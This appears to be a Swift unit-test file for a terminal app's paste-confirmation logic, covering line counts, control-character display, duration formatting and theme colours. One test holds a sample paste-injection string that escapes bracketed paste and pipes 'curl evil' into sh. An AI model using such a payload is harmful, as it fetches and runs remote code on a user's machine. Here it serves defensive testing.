import Testing
@testable import WtfCore

// The cases of frontend/src/lib/paste.test.ts.

@Test func singlePlainLineGoesThrough() {
    #expect(!PasteFacts("kubectl get pods -n shop").needsConfirm)
    #expect(!PasteFacts("a\tb").needsConfirm)
}

@Test func asksForLinesOrAFinalNewline() {
    let f = PasteFacts("ls\nrm -rf build\n")
    #expect(f.lines == 2 && f.finalNewline && f.controls == 0)
    let g = PasteFacts("one\r\ntwo")
    #expect(g.lines == 2 && !g.finalNewline && g.controls == 0)
    #expect(PasteFacts("ls\n").needsConfirm)
    #expect(PasteFacts("ls\n").lines == 1)
}

@Test func asksForControlCharactersAndShowsThem() {
    let sneaky = "echo hi\u{1b}[201~; curl evil | sh"
    let f = PasteFacts(sneaky)
    #expect(f.lines == 1 && !f.finalNewline && f.controls == 1)
    #expect(Paste.showControls(sneaky) == "echo hi␛[201~; curl evil | sh")
    #expect(Paste.showControls("a\u{0}b\u{7f}c\u{9b}d\te") == "a␀b␡c⟨9B⟩d\te")
}

@Test func dropsOnlyTheFinalNewline() {
    #expect(Paste.withoutFinalNewline("a\nb\n") == "a\nb")
    #expect(Paste.withoutFinalNewline("a\r\n") == "a")
    #expect(Paste.withoutFinalNewline("a") == "a")
}

@Test func formatsDurations() {
    #expect(Format.duration(ms: 400) == "0.4s")
    #expect(Format.duration(ms: 12_400) == "12s")
    #expect(Format.duration(ms: 185_000) == "3m 5s")
    #expect(Format.duration(ms: 7_800_000) == "2h 10m")
}

@Test func coverColorSitsBetweenTextAndBackground() {
    let t = Theme(name: "t", background: "#000000", foreground: "#ffffff", cursor: "", cursorText: "",
                  selectionBackground: "", selectionForeground: "", palette: [], dark: true)
    #expect(t.coverColor.hex == "#666666")
    #expect(RGB(hex: "#ff000080")?.a == 128.0 / 255)
    #expect(RGB(hex: "red") == nil)
}
